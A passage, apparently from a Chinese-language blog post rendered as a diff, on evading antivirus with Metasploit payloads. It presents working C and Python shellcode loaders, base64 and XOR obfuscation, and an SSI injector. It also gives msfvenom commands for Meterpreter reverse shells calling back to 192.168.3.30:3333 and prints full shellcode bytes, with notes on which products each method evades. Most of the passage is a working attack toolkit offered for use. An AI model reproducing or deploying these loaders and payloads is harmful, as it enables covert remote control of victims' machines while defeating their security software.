+    <span class="hljs-number">49</span>,  <span class="hljs-number">50</span>,  <span class="hljs-number">51</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span> &#125;;
+
+static char cmove_bits(unsigned char src, unsigned lnum, unsigned rnum) &#123;
+    src &lt;&lt;= lnum; <span class="hljs-comment">// src = src &lt;&lt; lnum;</span>
+    src &gt;&gt;= rnum; <span class="hljs-comment">// src = src &gt;&gt; rnum;</span>
+    <span class="hljs-keyword">return</span> src;
+&#125;
+
+<span class="hljs-built_in">int</span> base64_encode(<span class="hljs-keyword">const</span> char *indata, <span class="hljs-built_in">int</span> inlen, char *outdata, <span class="hljs-built_in">int</span> *outlen) &#123;
+
+    <span class="hljs-built_in">int</span> ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// return value</span>
+    <span class="hljs-keyword">if</span> (indata == NULL || inlen == <span class="hljs-number">0</span>) &#123;
+        <span class="hljs-keyword">return</span> ret = <span class="hljs-number">-1</span>;
+    &#125;
+
+    <span class="hljs-built_in">int</span> in_len = <span class="hljs-number">0</span>; <span class="hljs-comment">// 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数</span>
+    <span class="hljs-built_in">int</span> pad_num = <span class="hljs-number">0</span>; <span class="hljs-comment">// 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, )</span>
+    <span class="hljs-keyword">if</span> (inlen % <span class="hljs-number">3</span> != <span class="hljs-number">0</span>) &#123;
+        pad_num = <span class="hljs-number">3</span> - inlen % <span class="hljs-number">3</span>;
+    &#125;
+    in_len = inlen + pad_num; <span class="hljs-comment">// 拼接后的长度, 实际编码需要的长度(3的倍数)</span>
+
+    <span class="hljs-built_in">int</span> out_len = in_len * <span class="hljs-number">8</span> / <span class="hljs-number">6</span>; <span class="hljs-comment">// 编码后的长度</span>
+
+    char *p = outdata; <span class="hljs-comment">// 定义指针指向传出data的首地址</span>
+
+                       <span class="hljs-comment">//编码, 长度为调整后的长度, 3字节一组</span>
+    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; in_len; i += <span class="hljs-number">3</span>) &#123;
+        <span class="hljs-built_in">int</span> value = *indata &gt;&gt; <span class="hljs-number">2</span>; <span class="hljs-comment">// 将indata第一个字符向右移动2bit(丢弃2bit)</span>
+        char c = base64_alphabet[value]; <span class="hljs-comment">// 对应base64转换表的字符</span>
+        *p = c; <span class="hljs-comment">// 将对应字符(编码后字符)赋值给outdata第一字节</span>
+
+                <span class="hljs-comment">//处理最后一组(最后3字节)的数据</span>
+        <span class="hljs-keyword">if</span> (i == inlen + pad_num - <span class="hljs-number">3</span> &amp;&amp; pad_num != <span class="hljs-number">0</span>) &#123;
+            <span class="hljs-keyword">if</span> (pad_num == <span class="hljs-number">1</span>) &#123;
+                *(p + <span class="hljs-number">1</span>) = base64_alphabet[(<span class="hljs-built_in">int</span>)(cmove_bits(*indata, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>) + cmove_bits(*(indata + <span class="hljs-number">1</span>), <span class="hljs-number">0</span>, <span class="hljs-number">4</span>))];
+                *(p + <span class="hljs-number">2</span>) = base64_alphabet[(<span class="hljs-built_in">int</span>)cmove_bits(*(indata + <span class="hljs-number">1</span>), <span class="hljs-number">4</span>, <span class="hljs-number">2</span>)];
+                *(p + <span class="hljs-number">3</span>) = <span class="hljs-string">&#x27;=&#x27;</span>;
+            &#125;
+            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pad_num == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">// 编码后的数据要补两个 &#x27;=&#x27;</span>
+                *(p + <span class="hljs-number">1</span>) = base64_alphabet[(<span class="hljs-built_in">int</span>)cmove_bits(*indata, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>)];
+                *(p + <span class="hljs-number">2</span>) = <span class="hljs-string">&#x27;=&#x27;</span>;
+                *(p + <span class="hljs-number">3</span>) = <span class="hljs-string">&#x27;=&#x27;</span>;
+            &#125;
+        &#125;
+        <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 处理正常的3字节的数据</span>
+            *(p + <span class="hljs-number">1</span>) = base64_alphabet[cmove_bits(*indata, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>) + cmove_bits(*(indata + <span class="hljs-number">1</span>), <span class="hljs-number">0</span>, <span class="hljs-number">4</span>)];
+            *(p + <span class="hljs-number">2</span>) = base64_alphabet[cmove_bits(*(indata + <span class="hljs-number">1</span>), <span class="hljs-number">4</span>, <span class="hljs-number">2</span>) + cmove_bits(*(indata + <span class="hljs-number">2</span>), <span class="hljs-number">0</span>, <span class="hljs-number">6</span>)];
+            *(p + <span class="hljs-number">3</span>) = base64_alphabet[*(indata + <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0x3f</span>];
+        &#125;
+
+        p += <span class="hljs-number">4</span>;
+        indata += <span class="hljs-number">3</span>;
+    &#125;
+
+    <span class="hljs-keyword">if</span> (outlen != NULL) &#123;
+        *outlen = out_len;
+    &#125;
+
+    <span class="hljs-keyword">return</span> ret;
+&#125;
+
+
+<span class="hljs-built_in">int</span> base64_decode(<span class="hljs-keyword">const</span> char *indata, <span class="hljs-built_in">int</span> inlen, char *outdata) &#123;
+
+    <span class="hljs-built_in">int</span> ret = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">if</span> (indata == NULL || inlen &lt;= <span class="hljs-number">0</span> || outdata == NULL ) &#123;
+        <span class="hljs-keyword">return</span> ret = <span class="hljs-number">-1</span>;
+    &#125;
+    <span class="hljs-keyword">if</span> (inlen % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 需要解码的数据不是4字节倍数</span>
+        <span class="hljs-keyword">return</span> ret = <span class="hljs-number">-2</span>;
+    &#125;
+
+    <span class="hljs-built_in">int</span> t = <span class="hljs-number">0</span>, x = <span class="hljs-number">0</span>, y = <span class="hljs-number">0</span>, i = <span class="hljs-number">0</span>;
+    unsigned char c = <span class="hljs-number">0</span>;
+    <span class="hljs-built_in">int</span> g = <span class="hljs-number">3</span>;
+
+    <span class="hljs-keyword">while</span> (indata[x] != <span class="hljs-number">0</span>) &#123;
+        <span class="hljs-comment">// 需要解码的数据对应的ASCII值对应base64_suffix_map的值</span>
+        c = base64_suffix_map[indata[x++]];
+        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">255</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<span class="hljs-comment">// 对应的值不在转码表中</span>
+        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">253</span>) <span class="hljs-keyword">continue</span>;<span class="hljs-comment">// 对应的值是换行或者回车</span>
+        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">254</span>) &#123; c = <span class="hljs-number">0</span>; g--; &#125;<span class="hljs-comment">// 对应的值是&#x27;=&#x27;</span>
+        t = (t &lt;&lt; <span class="hljs-number">6</span>) | c; <span class="hljs-comment">// 将其依次放入一个int型中占3字节</span>
+        <span class="hljs-keyword">if</span> (++y == <span class="hljs-number">4</span>) &#123;
+            outdata[i++] = (unsigned char)((t &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>);
+            <span class="hljs-keyword">if</span> (g &gt; <span class="hljs-number">1</span>) outdata[i++] = (unsigned char)((t &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>);
+            <span class="hljs-keyword">if</span> (g &gt; <span class="hljs-number">2</span>) outdata[i++] = (unsigned char)(t &amp; <span class="hljs-number">0xff</span>);
+            y = t = <span class="hljs-number">0</span>;
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">return</span> ret;
+&#125;</code></pre>
+
+<p>base64.h</p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">ifndef base64_h</span>
+<span class="hljs-meta">#</span><span class="bash">define base64_h</span>
+
+<span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span>
+
+<span class="hljs-meta">#</span><span class="bash"><span class="hljs-keyword">if</span> __cplusplus</span>
+extern &quot;C&quot; &#123;
+<span class="hljs-meta">#</span><span class="bash">endif</span>
+
+    int base64_encode(const char *indata, int inlen, char *outdata, int *outlen);
+    int base64_decode(const char *indata, int inlen, char *outdata);
+
+<span class="hljs-meta">#</span><span class="bash"><span class="hljs-keyword">if</span> __cplusplus</span>
+&#125;
+<span class="hljs-meta">#</span><span class="bash">endif</span>
+
+<span class="hljs-meta">#</span><span class="bash">endif /* base64_h */</span></code></pre>
+
+<p>shellcode.c</p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;Windows.h&gt;</span>
+
+<span class="hljs-meta">#</span><span class="bash">include <span class="hljs-string">&quot;base64.h&quot;</span></span>
+
+unsigned char buf[] =
+&quot;msf base64 code&quot;;
+
+int main(int argc, const char * argv[]) &#123;
+
+
+    char str3[1000] = &#123; 0 &#125;;
+    //printf(&quot;%s &quot;, buf);
+    base64_decode(buf, (int)strlen(buf), str3);
+
+    //printf(&quot;%d  &quot;, sizeof(str3));
+
+    char *Memory;
+
+    Memory = VirtualAlloc(NULL, sizeof(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    memcpy(Memory, str3, sizeof(str3));
+
+    ((void(*)())Memory)();
+
+    return 0;
+&#125;</code></pre>
+
+<p>使用msf生成base64编码的shellcode</p>
+<pre><code class="hljs angelscript">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.30</span> lport=<span class="hljs-number">3333</span>  -f c &gt; shell.c</code></pre>
+
+<p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。</p>
+<p>使用gcc进行编译</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">shellcode</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">base64</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">test</span><span class="hljs-selector-class">.exe</span></code></pre>
+
+<p>执行exe即可上线</p>
+<h4 id="8-python变形shellcode-汇编代码-未能复现成功"><a href="#8-python变形shellcode-汇编代码-未能复现成功" class="headerlink" title="8.python变形shellcode+汇编代码(未能复现成功)"></a>8.python变形shellcode+汇编代码(未能复现成功)</h4><p>msf生成shellcode（就用这种吧，其他的下面脚本会报错）</p>
+<pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=192.168.3.30 lport=3333  -f c -o shell.c</code></pre>
+
+<p>python2环境，需要安装capstone和keystone-engine包。使用脚本对shellcode进行变形<code>https://github.com/sayhi2urmom/shellcodeseperator/blob/master/main.py</code></p>
+<p>将脚本中的<code>CODE = b&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;     </code>替换为shell.c的shellcode</p>
+<pre><code class="hljs shell">root@kali:~/webtools/BypassAntiVirus/encode_shellcode_python# python encode_shellcode.py
+unsigned char buf[]=&#123;0x90, 0xbb, 0x71, 0xe3, 0xaa, 0x34, 0x90, 0xdb, 0xcf, 0x90, 0xd9, 0x74, 0x24, 0xf4, 0x90, 0x58, 0x90, 0x29, 0xc9, 0x90, 0xb1, 0x59, 0x90, 0x83, 0xe8, 0xfc, 0x90, 0x31, 0x58, 0x10, 0x90, 0x3, 0x58, 0x10, 0x90, 0x93, 0x90, 0x66, 0x16, 0x90, 0x56, 0x90, 0xdc, 0xdc, 0x90, 0xd9, 0xa7, 0x1d, 0x82, 0x50, 0x42, 0x90, 0x2c, 0x90, 0x90, 0x66, 0x7, 0x90, 0x66, 0x6, 0x90, 0x1d, 0x24, 0x43, 0x4a, 0xae, 0x90, 0xcf, 0x90, 0x1, 0x7f, 0x25, 0x90, 0xbd, 0x8d, 0x4e, 0xc6, 0x4e, 0x90, 0x79, 0xe1, 0x90, 0x66, 0x1e, 0x90, 0x61, 0x90, 0x45, 0x90, 0x57&#125;;</code></pre>
+
+<p>再在vs2019中编译以下文件</p>
+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fucku __asm&#123;mov eax,eax&#125;</span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="hljs-comment">//windows控制台程序不出黑窗口</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;
+
+    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(*pfunc)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = &#123;&#125;;
+    fucku;
+    BYTE* sc = (BYTE*)VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(buf) + <span class="hljs-number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    fucku;
+    fucku;
+    <span class="hljs-comment">//memcpy(sc,buf,sizeof(buf));</span>
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(buf); i++) &#123;
+        fucku;
+        sc[i] = buf[i];
+    &#125;
+    pfunc shellcode = (pfunc)sc;
+    __asm &#123;
+        push shellcode
+        ret
+    &#125;
+    <span class="hljs-comment">//HANDLE lpThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)shellcode,NULL,0,NULL);</span>
+    <span class="hljs-comment">//WaitForSingleObject(lpThread,-1);</span>
+&#125;</code></pre>
+
+
+
+
+
+<h4 id="9-python-xor处理（VT-20-70-不能过360）"><a href="#9-python-xor处理（VT-20-70-不能过360）" class="headerlink" title="9.python+xor处理（VT:20/70 不能过360）"></a>9.python+xor处理（VT:20/70 不能过360）</h4><p>msf生成shellcode</p>
+<pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=192.168.3.30 lport=3333  -f c -o shell.c</code></pre>
+
+<p>python生成xor代码</p>
+<pre><code class="hljs shell">import re
+raw = r&quot;&quot;&quot;
+unsigned char buf[] =
+&quot;shellcode;
+&quot;&quot;&quot;
+regx = re.compile(r&quot;\\x\w\w&quot;)
+arr = re.findall(regx,raw)
+for i in range(0,len(arr)):
+    arr[i] = arr[i].replace(&quot;\\&quot;,&quot;0&quot;)
+data = &quot;&quot;&quot;
+<span class="hljs-meta">#</span><span class="bash">include &lt;windows.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">pragma comment(linker, <span class="hljs-string">&quot;/subsystem:\\&quot;</span>windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;<span class="hljs-string">&quot;)</span></span>
+void test()
+&#123;
+    unsigned char buf[333];
+
+&quot;&quot;&quot;
+data = data + &quot;    &quot;
+print(len(arr))
+for i in range(len(arr)):
+    data = data + &quot;buf[&quot;+ str(i) +&quot;] = &quot; + arr[i] + &quot;^ 0x5f ^ 0x5f;&quot;
+    if(i%100 == 0):
+        data = data + &quot;\r\n    &quot;
+
+data = data + &quot;&quot;&quot;
+    ((void(*)(void))&amp;buf)();
+&#125;
+int main(int argc, char* argv[])
+&#123;
+    test();
+    return 0;
+&#125;
+&quot;&quot;&quot;
+f = open(&quot;shellcode.txt&quot;,&quot;w&quot;)
+f.write(data)</code></pre>
+
+<p>再将生成<code>shellcode.txt</code>内容粘贴到vs2019中进行编译（注意1关闭DEP：调试-project调制属性-链接器-高级-DEP,注意2关闭优化：调试-project调制属性-C/C++-优化）</p>
+<h3 id="2-shellcode加载器"><a href="#2-shellcode加载器" class="headerlink" title="2.shellcode加载器"></a>2.shellcode加载器</h3><h4 id="1-使用shellcode-launcher（过不了微软）"><a href="#1-使用shellcode-launcher（过不了微软）" class="headerlink" title="1.使用shellcode_launcher（过不了微软）"></a>1.使用shellcode_launcher（过不了微软）</h4><p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/clinicallyinane/shellcode_launcher">https://github.com/clinicallyinane/shellcode_launcher</a></p>
+<p>msf生成raw格式的shellcode</p>
+<pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw -o shellcode.raw</code></pre>
+
+<p>在目标机器上用shellcode_launcher.exe执行</p>
+<pre><code class="hljs shell">shellcode_launcher.exe -i shellcode.raw</code></pre>
+
+<p>msf会正常上线。</p>
+<h4 id="2-使用SSI加载-VT-24-71-过360"><a href="#2-使用SSI加载-VT-24-71-过360" class="headerlink" title="2.使用SSI加载(VT:24/71 过360)"></a>2.使用SSI加载(VT:24/71 过360)</h4><p>msf生成c文件</p>
+<pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.3.30 LPORT=3333 -f c -o msf.txt</code></pre>
+
+<p>然后执行下面命令,会得到一串16进制字符串</p>
+<pre><code class="hljs shell">root@kali:~# cat msf.txt|grep -v unsigned|sed &quot;s/\&quot;\\\x//g&quot;|sed &quot;s/\\\x//g&quot;|sed &quot;s/\&quot;//g&quot;|sed &#x27;:a;N;$!ba;s/\n//g&#x27;|sed &quot;s/;//g&quot;
+fce88f0000006031d2648b52308b520c89e58b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b58205001d38b481885c9743c4931ff8b348b01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d686e6574006877696e6954684c772607ffd531db5353535353e83e0000004d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f00683a5679a7ffd553536a03535368050d0000e8e50000002f7a44506a36496a494e6b7271554f7452696c6f5854416f415550506a524338687250583938784d4e467a315249734850473030592d536931306a753848664c544d4442497a5a714139467232653567575a30793300506857899fc6ffd589c653680032e88453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8490000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff3139322e3136382e332e333000bbf0b5a2566a0053ffd5</code></pre>
+
+<p>然后使用win上的i686-w64-mingw32-gcc配合SimpleShellcodeInjector.c编译生成ssi.exe</p>
+<pre><code class="hljs shell">F:\mingw-w64\setting\mingw32\bin&gt;i686-w64-mingw32-gcc SimpleShellcodeInjector.c -o ssi.exe</code></pre>
+
+<p>其实在<code>SimpleShellcodeInjector\OLDBinary</code>文件中也有个ssi.exe，这是作者给编译好的，不过不建议使用，因为这个ssi.exe已经能被很多杀软查杀，最好就是使用上面的命令自己编译一个。使用编译生成的ssi.exe，参数为上面的16进制字符串，执行shellcode，msf可正常上线</p>
+<pre><code class="hljs shell">F:\mingw-w64\setting\mingw32\bin&gt;ssi.exe fce88f0000006031d2648b52308b520c89e58b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b58205001d38b481885c9743c4931ff8b348b01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d686e6574006877696e6954684c772607ffd531db5353535353e83e0000004d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f00683a5679a7ffd553536a03535368050d0000e8e50000002f7a44506a36496a494e6b7271554f7452696c6f5854416f415550506a524338687250583938784d4e467a315249734850473030592d536931306a753848664c544d4442497a5a714139467232653567575a30793300506857899fc6ffd589c653680032e88453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8490000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff3139322e3136382e332e333000bbf0b5a2566a0053ffd5</code></pre>
+
+
+
+<h2 id="2-python（文件比较大，不合适）"><a href="#2-python（文件比较大，不合适）" class="headerlink" title="2.python（文件比较大，不合适）"></a>2.python（文件比较大，不合适）</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HyBSqrF_kl2ARaCYAMefgA">https://mp.weixin.qq.com/s/HyBSqrF_kl2ARaCYAMefgA</a></p>
+<h3 id="1-通过py源码编译exe"><a href="#1-通过py源码编译exe" class="headerlink" title="1  通过py源码编译exe"></a>1  通过py源码编译exe</h3><h4 id="1-python加载C代码（VT-8-69-过360）"><a href="#1-python加载C代码（VT-8-69-过360）" class="headerlink" title="1.python加载C代码（VT:8/69 过360）"></a>1.python加载C代码（VT:8/69 过360）</h4><p>msf生成c文件</p>
+<pre><code class="hljs shell">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.3.30 LPORT=3333   -f c
+[*] exec: msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.3.30 LPORT=3333   -f c
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of c file: 1512 bytes
+unsigned char buf[] = 
+&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;
+&quot;\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28&quot;
+&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;
+&quot;\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;
+&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3&quot;
+&quot;\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1&quot;
+&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;
+&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;
+&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;
+&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;
+&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;
+&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;
